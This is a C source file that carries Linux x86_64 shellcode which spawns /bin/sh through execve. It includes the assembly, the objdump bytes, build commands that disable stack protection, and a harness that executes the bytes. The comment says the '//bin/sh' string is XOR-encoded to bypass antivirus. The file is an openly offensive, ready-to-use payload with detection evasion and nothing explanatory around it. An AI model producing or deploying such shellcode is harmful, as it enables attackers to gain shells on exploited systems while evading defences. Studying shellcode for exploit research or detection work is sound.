/*
*********
$ Infos $
*********
Author: vida
Github: https://github.com/vida00/
Command: excve("/bin/sh", NULL, NULL);
Description: bypass AV with xor in "//bin/sh"
Arch: linux x86_64

*****************
$ Assembly Code $
*****************
section .text
        global _start
_start:
    xor rdx, rdx
    xor rsi, rsi
    push 0x0
    mov rdi, 0x68732f6e28236e6e
    xor rdi, 0x41414141
    push rdi
    mov rdi, rsp
    mov al, 0x3b
    syscall

******************
$ objdump result $
******************
0000000000401000 <_start>:
  401000:       48 31 d2                xor    %rdx,%rdx
  401003:       48 31 f6                xor    %rsi,%rsi
  401006:       6a 00                   pushq  $0x0
  401008:       48 bf 6e 6e 23 28 6e    movabs $0x68732f6e28236e6e,%rdi
  40100f:       2f 73 68
  401012:       48 81 f7 41 41 41 41    xor    $0x41414141,%rdi
  401019:       57                      push   %rdi
  40101a:       48 89 e7                mov    %rsp,%rdi
  40101d:       b0 3b                   mov    $0x3b,%al
  40101f:       0f 05                   syscall

*****************
$ Compile & Run $
*****************
Assembly: nasm shellcode.asm -f elf64 && ld shellcode.o -o shellcode && ./shellcode
C: gcc shellcode.c -o shellcode -z execstack && ./shellcode
*/
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] = \
"\x48\x31\xd2\x48\x31\xf6\x6a\x00\x48\xbf\x6e\x6e\x23\x28\x6e\x2f\x73\x68\x48\x81\xf7\x41\x41\x41\x41\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
void main(){
    printf("Lenght: %d\n", sizeof(shellcode));
    (*(void(*)()) shellcode)();
}
